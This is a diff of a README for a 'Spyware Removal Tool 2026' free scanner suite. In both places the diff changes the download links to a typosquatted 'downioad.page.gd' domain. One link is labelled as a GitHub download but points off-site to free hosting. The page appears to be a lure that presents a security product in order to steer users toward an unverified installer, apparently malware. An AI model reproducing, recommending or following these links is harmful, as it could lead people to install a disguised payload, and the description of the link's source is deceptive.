@@ -2,7 +2,7 @@
 
 The Spyware Removal Tool 2026 Advanced Free Scanner Suite is a comprehensive solution designed to help users detect and remove spyware from their Windows desktop systems. This tool offers a robust set of features to ensure your computer remains protected from unwanted surveillance and threats, with a focus on ease of use and reliability.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -66,7 +66,7 @@ The Spyware Removal Tool employs a multi-layered approach to system protection. 
 
 To get started with the Spyware Removal Tool 2026, download the latest version directly from our GitHub page. This ensures you have the most up-to-date and secure release.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Copyright and Disclaimer
 
